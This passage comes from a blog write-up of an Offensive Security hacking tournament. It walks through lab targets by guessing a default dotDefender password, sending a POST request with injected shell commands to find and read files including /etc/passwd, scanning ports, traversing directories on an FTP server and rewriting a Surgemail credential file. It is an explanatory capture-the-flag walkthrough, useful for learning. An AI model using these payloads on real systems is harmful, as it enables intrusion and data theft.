+<p>At the same time, the only thing we see is the login page. So my 
+initial plan was not to start “hammering” on the login page, but rather 
+to see if the form/login page will give us some information that can be 
+helpful to get access to the system (regardless of whether there is 
+something behind the login page).</p>
+<p>Of course, if that wouldn’t lead to anything useful, I could still do plan B : bruteforcing files and directories.</p>
+<p>I had a quick look at the source (fields, forms, etc) of the login 
+page but there was not much to see.&nbsp; So my next step was to see 
+what kind of error messages I could trigger when doing some simple 
+tests.&nbsp; I decided to start with a simple sql injection attempt 
+(basically just put a single quote in the Username field).</p>
+<p>That attempt redirected me to an error page generated by a plugin called dotDefender.</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image39.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb39.png" alt="image" width="295" height="179" border="0"></a></p>
+<p><em>Note : at the time of writing this documentation, it looks like 
+the offsec crew changed the behaviour to block the display of the 
+dotDefender error message :</em></p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image411.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image41_thumb.png" alt="image" width="468" height="183" border="0"></a></p>
+<p>Look at the page source of the page :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image110.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image1_thumb.png" alt="image" width="464" height="230" border="0"></a></p>
+<p>=&gt; clear reference to “Applicure”, which is the company that developed dotDefender :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image3.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb3.png" alt="image" width="352" height="231" border="0"></a></p>
+<p>So from this point forward, it pretty easy to figure out that 
+dotDefender is installed in the /dotDefender folder. (Grab yourself a 
+trial version, install it, done… or just Google for it)</p>
+<p>Anyways, by navigating into the dotDefender folder, I got a prompt for a username and password (basic authentication request)</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image81.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image8_thumb.png" alt="image" width="480" height="170" border="0"></a></p>
+<p>The login text says I should try “admin” as username.&nbsp; Let’s try
+ some obvious combinations things.&nbsp; admin/admin, admin/1234, 
+admin/password… bingo !&nbsp; the admin/password combination worked 
+fine.</p>
+<p>That brings us to vulnerability 1 : the username is admin, and the 
+password is “password”. The configuration of an easy-to-guess password 
+(in combination with the fact that the admin account name was displayed 
+on the login form), allows me to get access to the dotDefender Site 
+Management page.&nbsp; This poor configuration would allow unauthorized 
+people to change the dotDefender configuration, potentially allowing 
+them to bypass input restrictions.</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image5.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb5.png" alt="image" width="353" height="305" border="0"></a></p>
+<p>That’s nice, but it might not help me bypassing the login form, as 
+the “Stop dotDefender” button doens’t really seem to do anything.&nbsp; 
+So I did a quick search for vulnerabilities in the dotDefender plugin, 
+and I got this :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image6.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb6.png" alt="image" width="275" height="181" border="0"></a></p>
+<p><a title="http://www.exploit-db.com/exploits/10261" href="http://www.exploit-db.com/exploits/10261">http://www.exploit-db.com/exploits/10261</a></p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">An attack looks like:
+
+--------------------/Request/--------------------
+POST /dotDefender/index.cgi HTTP/1.1
+Host: 172.16.159.132
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US;
+rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: https://172.16.159.132/dotDefender/index.cgi
+Authorization: Basic YWRtaW46
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 95
+
+sitename=dotdefeater&amp;deletesitename=dotdefeater;id;ls -al
+../;pwd;&amp;action=deletesite&amp;linenum=15
+
+--------------------/Response/--------------------</pre>
+<p>So it looks like we can use a specially crafted POST request to execute commands on the file system.</p>
+<p>If that is true, we can simply try to&nbsp; “find” the secret file on the filesystem and display it’s contents :</p>
+<p>By hooking a web proxy between your browser and the server (or by 
+using a custom Request editor such as Burp), we can craft/manipulate 
+a&nbsp; request and insert the evil payload, basically trying to find 
+the location of the n00bSecret.txt file. The fields to alter are</p>
+<ul>
+<li>Host</li>
+<li>Referer</li>
+<li>Authorization</li>
+<li>and of course, the command to execute (“find” command in this case)</li>
+</ul>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">POST /dotDefender/index.cgi HTTP/1.1
+Host: www1.noob-filter.com
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100330 Fedora/3.5.9-1.fc11 Firefox/3.5.9
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://www1.noob-filter.com/dotdefender/index.cgi
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+
+sitename=dotdefeater&amp;deletesitename=dotdefeater;find / -name n00bSecret.txt;
+&amp;action=deletesite&amp;linenum=15</pre>
+<p>Wait until the find operation completes and review the results that are sent back by the server :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image7.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb7.png" alt="image" width="434" height="271" border="0"></a></p>
+<p>Nice.</p>
+<p>I crafted another request, displaying the contents of the file :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image8.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb8.png" alt="image" width="447" height="254" border="0"></a></p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image44.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image44_thumb.png" alt="image" width="452" height="210" border="0"></a></p>
+<p>Game over… and my friends just arrived….&nbsp; Perfect timing :)</p>
+<p>&nbsp;</p>
+<h4>Conclusions :</h4>
+<p>A number of critical vulnerabilities were found :</p>
+<ul>
+<li>Weak admin username/password + display of admin username in the login form of dotDefender.</li>
+<li>Access to the dotDefender admin page from the internet.&nbsp; Access to admin pages should be restricted to trusted IP’s only.</li>
+<li>Access to login forms/admin pages in general should be at least protected via SSL</li>
+<li>Remote Command Execution vulnerability in the dotDefender plugin, 
+allowing to steal sensitive information from the system (n00bSecret.txt 
+was just an example. You can also get some other files from the system 
+:)</li>
+</ul>
+<p>/etc/passwd</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image10.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb10.png" alt="image" width="197" height="147" border="0"></a></p>
+<p>&nbsp;</p>
+<p>After entering my key in the Scoreboard/Control Panel login form, I got 25 points and was able to download the VPN files.</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image48.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image48_thumb.png" alt="image" width="306" height="162" border="0"></a></p>
+<p>(don’t pay attention to the points – I made the screenshot while working on the last assignment)</p>
+<blockquote><p>So far so good, time to party with my friends. I set up 
+the VPN connection and joined my wife and friends to have a little 
+party.</p></blockquote>
+<p>Update : 11:30pm – friends went home, I’m a bit drunk… but ready to start with the real challenge !</p>
+<blockquote><p>Note : It took until sunday evening before the first 100 
+participants hacked their way through the n00bfilter…&nbsp; So I guess I
+ didn’t really had to hurry up after all :-) Oh well…</p></blockquote>
+<p>&nbsp;</p>
+<h3>Target infrastructure</h3>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/CTFTarget.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="CTFTarget" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/CTFTarget_thumb.png" alt="CTFTarget" width="379" height="514" border="0"></a></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h3>Challenge 1 : killthen00b</h3>
+<p>After checking that my vpn connection to the offsec labs still worked
+ (I was assigned IP 192.168.6.114) , I decided to start with challenge 
+“killthen00b”. The machines running this challenge were hosted at IP 
+192.168.6.70, .71 and .72</p>
+<blockquote><p>Part of the challenge is to deal with the process of 
+reverts. Every 30 minutes, the machines get reverted to the previous 
+snapshot, basically removing all of the changes that were applied to the
+ system in the last 30 minutes.</p></blockquote>
+<p>A quick portscan (not a complete scan – I figured I could still run a
+ full scan while looking at the obvious ports) on one of these 3 
+machines indicates the following “Interesting ports”</p>
+<p><strong>TCP Scan :</strong></p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">peter@krypt2:~$ nmap -A 192.168.6.70 -nvv
+
+Starting Nmap 5.21 ( http:<span style="color: #d7df01;">//nmap.org ) at 2010-05-09 12:24 CEST</span>
+NSE: Loaded 36 scripts for scanning.
+Initiating Ping Scan at 12:24
+Scanning 192.168.6.70 [2 ports]
+Completed Ping Scan at 12:24, 2.30s elapsed (1 total hosts)
+Initiating Connect Scan at 12:24
+Scanning 192.168.6.70 [1000 ports]
+Discovered <span style="color: #5576D1;">open</span> port 21/tcp on 192.168.6.70
+Discovered <span style="color: #5576D1;">open</span> port 993/tcp on 192.168.6.70
+Discovered <span style="color: #5576D1;">open</span> port 995/tcp on 192.168.6.70
+Discovered <span style="color: #5576D1;">open</span> port 80/tcp on 192.168.6.70
+Discovered <span style="color: #5576D1;">open</span> port 143/tcp on 192.168.6.70
+Discovered <span style="color: #5576D1;">open</span> port 587/tcp on 192.168.6.70
+Discovered <span style="color: #5576D1;">open</span> port 25/tcp on 192.168.6.70
+Discovered <span style="color: #5576D1;">open</span> port 110/tcp on 192.168.6.70
+Discovered <span style="color: #5576D1;">open</span> port 3389/tcp on 192.168.6.70
+Discovered <span style="color: #5576D1;">open</span> port 7025/tcp on 192.168.6.70
+Discovered <span style="color: #5576D1;">open</span> port 465/tcp on 192.168.6.70
+Discovered <span style="color: #5576D1;">open</span> port 7443/tcp on 192.168.6.70
+Discovered <span style="color: #5576D1;">open</span> port 366/tcp on 192.168.6.70
+Discovered <span style="color: #5576D1;">open</span> port 106/tcp on 192.168.6.70
+Completed Connect Scan at 12:24, 6.58s elapsed (1000 total ports)
+Initiating Service scan at 12:24
+Scanning 14 services on 192.168.6.70
+Completed Service scan at 12:24, 22.05s elapsed (14 services on 1 host)</pre>
+<p><strong>UDP Scan :</strong></p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">Nmap scan report for 192.168.6.70
+Host is up (0.052s latency).
+Not shown: 999 <span style="color: #5576D1;">open</span>|filtered ports
+PORT    STATE SERVICE
+137/udp <span style="color: #5576D1;">open</span>  netbios-ns
+MAC Address: 00:50:56:BC:1C:69 (VMware)</pre>
+<p>Based on the MAC address, the machine is running as a guest inside 
+VMWare.&nbsp; This may be interesting information for a pentester… If he
+ can own the guest, he may be able to attack the host (VMWare) system as
+ well.&nbsp;&nbsp; Of course, the MAC addresses may be changed on 
+purpose, but that is not relevant at this point.</p>
+<p>Let’s have a look at the services and see if I can find some obvious issues.</p>
+<p>First of all, the tournament Hints/Help page indicated that the FTP credentials are devil/killthen00b.</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image12.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb12.png" alt="image" width="326" height="164" border="0"></a></p>
+<p>Since FTP is at the top of the list (see TCP Scan), let’s find out if these credentials work :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">peter@krypt2:~$ ftp 192.168.6.70
+Connected to 192.168.6.70.
+220-Complete FTP server
+220 FTP Server v 3.3.0
+Name (192.168.6.70:peter): devil
+331 Password required for devil
+Password:
+230 User devil logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; pwd
+257 "<span style="color: #7fec7f;">/MyDocuments</span>" is current directory.
+ftp&gt; ls
+200 PORT command successful.
+150 Opening ASCII mode <span style="color: #5576D1;">data</span> connection for listing
+dr-xrwx--- 1 admin users              0 May 04 00:10 My Music
+dr-xrwx--- 1 admin users              0 May 04 00:10 My Pictures
+dr-xrwx--- 1 admin users              0 May 04 00:10 My Videos
+226 Transfer complete.
+ftp&gt;</pre>
+<p>Ok, credentials work fine.&nbsp; But there’s not a lot of information
+ that can be found here. It looks like we are stuck in the My Documents 
+folder</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">257 "<span style="color: #7fec7f;">/MyDocuments</span>" is current directory.
+ftp&gt; cd ..
+550 CWD: Operation not permitted.
+ftp&gt;</pre>
+<p>&nbsp;</p>
+<p>The server banner returns “Complete FTP server”.&nbsp; A quick search
+ on exploit-db shows that this FTP server (if we can believe the banner 
+of course) may suffer from a directory traversal vulnerability : <a title="http://www.exploit-db.com/exploits/11973" href="http://www.exploit-db.com/exploits/11973">http://www.exploit-db.com/exploits/11973</a>.</p>
+<p>So let’s see if we can break out of the root using the directory traversal vulnerability on this ftp server :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">ftp&gt; cd \..\..\..\
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/......</span>".
+ftp&gt; ls
+200 PORT command successful.
+150 Opening ASCII mode <span style="color: #5576D1;">data</span> connection for listing
+dr-xrwx--- 1 admin users              0 May 04 00:10 AppData
+dr-xrwx--- 1 admin users              0 May 04 00:10 Application Data
+dr-xrwx--- 1 admin users              0 May 04 00:10 Cookies
+dr-xrwx--- 1 admin users              0 Jul 13 2009 Desktop
+dr-xrwx--- 1 admin users              0 May 04 00:10 Documents
+dr-xrwx--- 1 admin users              0 Jul 13 2009 Downloads
+dr-xrwx--- 1 admin users              0 Jul 13 2009 Favorites
+dr-xrwx--- 1 admin users              0 Jul 13 2009 Links
+dr-xrwx--- 1 admin users              0 May 04 00:10 Local Settings
+dr-xrwx--- 1 admin users              0 Jul 13 2009 Music
+dr-xrwx--- 1 admin users              0 May 04 00:10 My Documents
+dr-xrwx--- 1 admin users              0 May 04 00:10 NetHood
+dr-xrwx--- 1 admin users              0 Jul 13 2009 Pictures
+dr-xrwx--- 1 admin users              0 May 04 00:10 PrintHood
+dr-xrwx--- 1 admin users              0 May 04 00:10 Recent
+dr-xrwx--- 1 admin users              0 Jul 13 2009 Saved Games
+dr-xrwx--- 1 admin users              0 May 04 00:10 SendTo
+dr-xrwx--- 1 admin users              0 May 04 00:10 Start Menu
+dr-xrwx--- 1 admin users              0 May 04 00:10 Templates
+dr-xrwx--- 1 admin users              0 Jul 13 2009 Videos
+-r--rr---- 1 admin users         262144 May 04 00:10 NTUSER.DAT
+-r--rr---- 1 admin users         226304 May 04 00:10 ntuser.dat.LOG1
+-r--rr---- 1 admin users              0 May 04 00:10 ntuser.dat.LOG2
+-r--rr---- 1 admin users          65536 May 04 00:10 NTUSER.DAT{6cced2f1-...
+-r--rr---- 1 admin users         524288 May 04 00:10 NTUSER.DAT{6cced2f1-...
+-r--rr---- 1 admin users         524288 May 04 00:10 NTUSER.DAT{6cced2f1-...
+-r--rr---- 1 admin users             20 May 04 00:10 ntuser.ini
+226 Transfer complete.
+ftp&gt; cd \..\..\..\
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../......</span>".
+ftp&gt; ls
+200 PORT command successful.
+150 Opening ASCII mode <span style="color: #5576D1;">data</span> connection for listing
+dr-xrwx--- 1 admin users              0 May 03 23:05 Administrator
+dr-xrwx--- 1 admin users              0 Jul 13 2009 All Users
+dr-xrwx--- 1 admin users              0 Aug 31 2009 Default
+dr-xrwx--- 1 admin users              0 Jul 13 2009 Default User
+dr-xrwx--- 1 admin users              0 May 04 00:06 devil
+dr-xrwx--- 1 admin users              0 May 04 00:08 ftp
+dr-xrwx--- 1 admin users              0 Jul 13 2009 Public
+dr-xrwx--- 1 admin users              0 May 04 00:10 TEMP
+-r--rr---- 1 admin users            174 Jul 13 2009 desktop.ini
+226 Transfer complete.
+ftp&gt; cd \..\..\..\
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../......</span>".
+ftp&gt; ls
+200 PORT command successful.
+150 Opening ASCII mode <span style="color: #5576D1;">data</span> connection for listing
+dr-xrwx--- 1 admin users              0 May 03 22:58 $Recycle.Bin
+dr-xrwx--- 1 admin users              0 Jul 13 2009 Documents and Settings
+dr-xrwx--- 1 admin users              0 Jul 13 2009 PerfLogs
+dr-xrwx--- 1 admin users              0 May 03 19:20 Program Files
+dr-xrwx--- 1 admin users              0 May 03 19:21 ProgramData
+dr-xrwx--- 1 admin users              0 May 03 22:51 Python26
+dr-xrwx--- 1 admin users              0 Apr 30 01:21 Recovery
+dr-xrwx--- 1 admin users              0 May 06 05:01 surgemail
+dr-xrwx--- 1 admin users              0 May 03 22:38 System Volume Information
+dr-xrwx--- 1 admin users              0 May 04 00:10 Users
+dr-xrwx--- 1 admin users              0 May 03 21:28 Windows
+-r--rr---- 1 admin users             24 Jun 10 2009 autoexec.bat
+-r--rr---- 1 admin users             10 Jun 10 2009 config.<span style="color: #5576D1;">sys</span>
+-r--rr---- 1 admin users     2043449344 May 03 23:14 pagefile.<span style="color: #5576D1;">sys</span>
+-r--rr---- 1 admin users       12645888 May 03 05:53 surgemail_installer.exe
+226 Transfer complete.
+ftp&gt;</pre>
+<p>Nice, so we have access to the entire disk.&nbsp;&nbsp; I started 
+downloading most of the files, to see if I would need to analyze them 
+later on.&nbsp; (After all, files such as NTUSER.dat.* may contain 
+sensitive information)</p>
+<p>Before continuing, let’s look at the other services. Perhaps we can 
+use the fact that we can access the filesystem to get some information 
+about the configuration of these services.</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">Nmap scan report for 192.168.6.70
+Host is up (0.13s latency).
+Scanned at 2010-05-09 12:24:15 CEST for 37s
+Not shown: 986 filtered ports
+PORT     STATE SERVICE       VERSION
+21/tcp   <span style="color: #5576D1;">open</span>  ftp
+|_ftp-anon: Anonymous FTP login allowed
+25/tcp   <span style="color: #5576D1;">open</span>  smtp          Surgemail smtpd 3.8k4-4
+|_smtp-commands: EHLO killthen00b. Hello example.org (192.168.6.114), AUTH PLAIN LOGIN, ETRN, X-ID 6b696c6c7468656e30306231323732393539363939, SIZE 20971520, HELP
+80/tcp   <span style="color: #5576D1;">open</span>  http          DNews Web Based Manager
+|_http-favicon: Unknown favicon MD5: 803DA8BF442FFF23072386E2B5EF2928
+|_html-title: SurgeMail Welcome Page
+106/tcp  <span style="color: #5576D1;">open</span>  pop3pw        Qualcomm poppassd (Maximum users connected)
+110/tcp  <span style="color: #5576D1;">open</span>  pop3          SurgeMail pop3d 3.8k4-4
+143/tcp  <span style="color: #5576D1;">open</span>  imap          SurgeMail imapd 3.8k4-4
+|_imap-capabilities: UIDPLUS SURGEMAIL IMAP4REV1 IMAP4 XFLDDATA IDLE NAMESPACE QUOTA
+366/tcp  <span style="color: #5576D1;">open</span>  smtp          Surgemail smtpd 3.8k4-4
+465/tcp  <span style="color: #5576D1;">open</span>  ssl/smtp      Surgemail smtpd 3.8k4-4
+| sslv2: server still supports SSLv2
+|       SSL2_DES_192_EDE3_CBC_WITH_MD5
+|       SSL2_IDEA_128_CBC_WITH_MD5
+|       SSL2_RC2_CBC_128_CBC_WITH_MD5
+|       SSL2_RC4_128_WITH_MD5
+|       SSL2_DES_64_CBC_WITH_MD5
+|_      SSL2_RC4_128_EXPORT40_WITH_MD5
+587/tcp  <span style="color: #5576D1;">open</span>  smtp          Surgemail smtpd 3.8k4-4
+993/tcp  <span style="color: #5576D1;">open</span>  ssl/imap      SurgeMail imapd 3.8k4-4
+| sslv2: server still supports SSLv2
+|       SSL2_DES_192_EDE3_CBC_WITH_MD5
+|       SSL2_IDEA_128_CBC_WITH_MD5
+|       SSL2_RC2_CBC_128_CBC_WITH_MD5
+|       SSL2_RC4_128_WITH_MD5
+|       SSL2_DES_64_CBC_WITH_MD5
+|_      SSL2_RC4_128_EXPORT40_WITH_MD5
+|_imap-capabilities: UIDPLUS SURGEMAIL IMAP4REV1 IMAP4 ...
+995/tcp  <span style="color: #5576D1;">open</span>  ssl/pop3      SurgeMail pop3d 3.8k4-4
+| sslv2: server still supports SSLv2
+|       SSL2_DES_192_EDE3_CBC_WITH_MD5
+|       SSL2_IDEA_128_CBC_WITH_MD5
+|       SSL2_RC2_CBC_128_CBC_WITH_MD5
+|       SSL2_RC4_128_WITH_MD5
+|       SSL2_DES_64_CBC_WITH_MD5
+|_      SSL2_RC4_128_EXPORT40_WITH_MD5
+|_pop3-capabilities: USER SURGEMAIL UIDL TOP OK(K Capability list follows)
+3389/tcp <span style="color: #5576D1;">open</span>  microsoft-rdp Microsoft Terminal Service
+7025/tcp <span style="color: #5576D1;">open</span>  ssl/http      DNews Web Based Manager
+| sslv2: server still supports SSLv2
+|       SSL2_DES_192_EDE3_CBC_WITH_MD5
+|       SSL2_IDEA_128_CBC_WITH_MD5
+|       SSL2_RC2_CBC_128_CBC_WITH_MD5
+|       SSL2_RC4_128_WITH_MD5
+|       SSL2_DES_64_CBC_WITH_MD5
+|_      SSL2_RC4_128_EXPORT40_WITH_MD5
+|_html-title: SurgeMail (killthen00b)
+|_http-favicon: Unknown favicon MD5: 803DA8BF442FFF23072386E2B5EF2928
+7443/tcp <span style="color: #5576D1;">open</span>  ssl/http      Surgemail webmail (DNews based)
+| sslv2: server still supports SSLv2
+|       SSL2_DES_192_EDE3_CBC_WITH_MD5
+|       SSL2_IDEA_128_CBC_WITH_MD5
+|       SSL2_RC2_CBC_128_CBC_WITH_MD5
+|       SSL2_RC4_128_WITH_MD5
+|       SSL2_DES_64_CBC_WITH_MD5
+|_      SSL2_RC4_128_EXPORT40_WITH_MD5
+|_http-favicon: Unknown favicon MD5: 803DA8BF442FFF23072386E2B5EF2928
+|_html-title: SurgeMail Welcome Page
+1 service unrecognized despite returning <span style="color: #5576D1;">data</span>. 
+If you know the service/<span style="color: #5576D1;">version</span>, please submit the following fingerprint 
+at http:<span style="color: #d7df01;">//www.insecure.org/cgi-bin/servicefp-submit.cgi :</span>
+SF-Port21-TCP:V=5.21%I=7%D=5/9%Time=4BE68D5E%P=i686-pc-linux-gnu%r(NULL,31
+SF:,"<span style="color: #7fec7f;">220-Complete\x20FTP\x20server\r\n220\x20FTP\x20Server\x20v\x203\.3\.0
+</span>SF:\r\n"<span style="color: #7fec7f;">)%r(GenericLines,31,</span>"220-Complete\x20FTP\x20server\r\n220\x20FTP\x
+SF:20Server\x20v\x203\.3\.0\r\n"<span style="color: #7fec7f;">)%r(Help,54,</span>"220-Complete\x20FTP\x20server
+SF:\r\n220\x20FTP\x20Server\x20v\x203\.3\.0\r\n502\x20Command\x20not\x20im
+SF:plemented:\x20HELP\r\n"<span style="color: #7fec7f;">)%r(SMBProgNeg,31,</span>"220-Complete\x20FTP\x20server
+SF:\r\n220\x20FTP\x20Server\x20v\x203\.3\.0\r\n"<span style="color: #7fec7f;">);
+</span>Service Info: Host: killthen00b; OS: Windows</pre>
+<p>Ok, so we have Qualcomm poppassd, Surgemail and some other stuff.</p>
+<p>Where to start ?&nbsp; This is what I did :</p>
+<p>Surgemail allows access to certain services via a webpage.&nbsp; 
+Surgemail is a name that showed up a few times in the nmap services 
+list.&nbsp; So it looks like Surgemail is reponsible for the vast 
+majority of the services on this machine.</p>
+<p>If you have to pick something to start with, and you see that one 
+application appears to be responsible for most of the services on the 
+machine, then I figured this is a high risk/high impact service.</p>
+<p>In the ftp listing of the root of the drive, I noticed 2 references to Surgemail :</p>
+<ul>
+<li>a folder called “surgemail”</li>
+<li>a file called “surgemail_installer.exe”</li>
+</ul>
+<p>I downloaded the installer file (<em>which was still possible when I was connected to the lab</em>)
+ and installed it on a test box.&nbsp; During the installation of 
+surgemail on my test box, I created an admin account (user: admin/ 
+password: admin) and tried to find the file where the admin 
+username/password was stored.&nbsp; I discovered that credentials get 
+stored into a file called nwauth.add</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image55.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image55_thumb.png" alt="image" width="529" height="439" border="0"></a></p>
+<p>So let’s see if we can use this to get ourselves an admin account in 
+surgemail on the lab machine… Maybe the hashing/encoding of the password
+ will work for any account (no salt etc).</p>
+<p>Still connected via FTP, I downloaded the nwauth.add file from the server</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../....../......</span>".
+ftp&gt; cd surgemail
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../....../....../surgemail</span>".
+ftp&gt; get nwauth.add
+<span style="color: #5576D1;">local</span>: nwauth.add remote: nwauth.add
+200 PORT command successful.
+150 Opening BINARY mode data connection for nwauth.add
+226 Transfer complete.
+227 bytes received in 0.00 secs (152.9 kB/s)
+ftp&gt; bye
+221 Goodbye.
+
+root@krypt2:/vpn/70# cat nwauth.add
+n00b@killthen00b:{ssha}floeVmRUcb7ku3ChQzBdC4acP3ugCInK:created="<span style="color: #7fec7f;">1272891311</span>" 
+mailaccess="" mailstatus="" admin_access="" quota="" expire="<span style="color: #7fec7f;">0</span>" full_name="" 
+max_in="" phone="" smsto="" user_access="" alias_quota="" list_quota=""</pre>
+<p>I simply changed the password for the n00b user, added a new user 
+corelanc0d3r (again with the same “admin” hash), and then uploaded the 
+file. I also added a user devil (again with the same password), and 
+uploaded the file again to the server</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">peter@krypt2:/vpn/70$ cat nwauth.<span style="color: #5576D1;">add</span>
